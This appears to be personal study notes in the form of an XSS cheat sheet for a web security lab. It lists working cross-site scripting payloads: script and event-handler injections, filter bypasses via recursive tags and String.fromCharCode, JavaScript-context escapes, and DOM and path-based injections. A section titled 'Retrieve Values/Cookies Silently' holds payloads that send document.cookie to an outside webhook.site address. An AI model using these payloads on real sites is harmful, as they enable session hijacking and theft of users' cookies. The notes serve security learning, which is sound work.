# XSS (cross site scripting)

## References & Resources

- [What is XSS](https://portswigger.net/web-security/cross-site-scripting)

## Exploits

```
http://url/index.php?name=%3Cscript%3Ealert(%27<SOME-MESSAGE>%27)%3C/script%3E
<a href="javascript: alert() />
http://url?name=<sCript>alert('VALUE')</sCript>
```

## Notes:

### Filter should be recursive
```
<scr<script>ipt>alert('1)</scr</script>ipt>
```

### There are a lot of ways to get JavaScript to be run (non-exhaustive list):

- with the <a tag and for the following events: onmouseover (you will need to pass your mouse over the link), onmouseout, onmousemove, onclick ...
- with the <a tag directly in the URL: <a href='javascript:alert(1)'... (you will need to click the link to trigger the JavaScript code and remember that this won't work since you cannot use script in this example).
- with the <img tag directly with the event onerror: <img src='zzzz' onerror='alert(1)' />.
- with the <div tag and for the following events: onmouseover (you will need to pass your mouse over the link), onmouseout, onmousemove, onclick...
alert('bc1a6da5-0cc8-4964-bb99-ad8487421dfd')

Exploints:
```
<img onerror: <img src='zzzz' onerror='alert("message")' />
<div onmouseout:'javascript:alert(1)'></div>
```

## When `alert` is filetered

- We can use `confirm`
- `eval(String.fromCharCode())`

Exploits:
```
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>eval("al"%2b"rt(%27meesage%27)")</script>
```

## Retrieve Values/Cookies Silently

```
$ <script>document.write('<img src="http://webhook.site/dfb22eb9-d819-4f95-9010-9ee608781a32?c='+document.cookie+'"/>');</script>

$(encoded + as %2b) <script>document.write('<img src="http://webhook.site/dfb22eb9-d819-4f95-9010-9ee608781a32?c='%2bdocument.cookie%2b'"/>');</script>
```

## Bypass Javascript. Escape Valid JS

You will need to get rid of the code after your injection point by commenting it out (using //) or by adding some dummy code (var $dummy = ") to close it correctly.

Example JS
```html
<p>Welcome!
  <script>
    var $a= "message";
  </script>
</p>
```

Exploit:
```
http://ptl-4f128216-57a5c435.libcurl.st/index.php?name=var $dummy = ";alert(1)//
http://ptl-4f128216-57a5c435.libcurl.st/index.php?name=test ";alert(1)//
http://url/index.php?name=hacker%27;alert(1)//
```

## Post (PHP) vulnerability

## DOM-based XSS


If you use the payload as part of the URL, this can be used to trigger a XSS vulnerability.

Since most browsers now encode the fragment, this vulnerable application decodes the fragment using the function decodeURIComponent(...). With old browsers, the exploitation works even if decodeURIComponent(...) is not present.

Example:
```
html
<p>Welcome <script>document.write(decodeURIComponent(location.hash.substring(1)));</script></p>
```

Exploit:
```
http://url/index.php#<script>alert(10)</script>
```

Path:
```
http://url/index.php
```
Exploit:
```
http://url/index.php/randomtest"><script>alert('msg')</script><
```
This Builds
```html
<form action="/index.php/randomtest"><script>alert('val')</script><" method="POST">
  Your name:<input type="text" name="name" />
<input type="submit" name="submit"/>
```
